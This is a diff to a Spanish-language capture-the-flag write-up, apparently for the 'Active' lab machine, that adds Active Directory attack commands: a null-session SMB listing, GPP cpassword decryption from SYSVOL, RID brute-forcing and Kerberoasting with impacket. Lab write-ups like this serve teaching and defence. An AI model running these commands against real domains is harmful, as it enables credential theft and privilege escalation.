@@ -41,7 +41,9 @@ Replication   Disk
 
 ## Enumeración
 
-- Puertos, servicios y usuarios relevantes descritos en «Reconocimiento».
+- `smbclient -L //<IP>/ -N` acepta sesión nula y lista `Replication` (el SYSVOL replicado). Sin credenciales se recorre `active.htb\Policies\{...}\MACHINE\Preferences\Groups\Groups.xml`.
+- El `cpassword` se descifra con `gpp-decrypt` porque la clave AES de GPP es pública desde MS14-025: sale `SVC_TGS`.
+- Con `SVC_TGS` se enumeran usuarios por RID (`nxc smb <IP> -u SVC_TGS -p <pass> --rid-brute`) y se piden TGS con `impacket-GetUserSPNs 'active.htb/SVC_TGS:<pass>' -dc-ip <IP> -request`: el SPN de **Administrator** aparece porque nadie lo justificó.
 
 ## Foothold
 
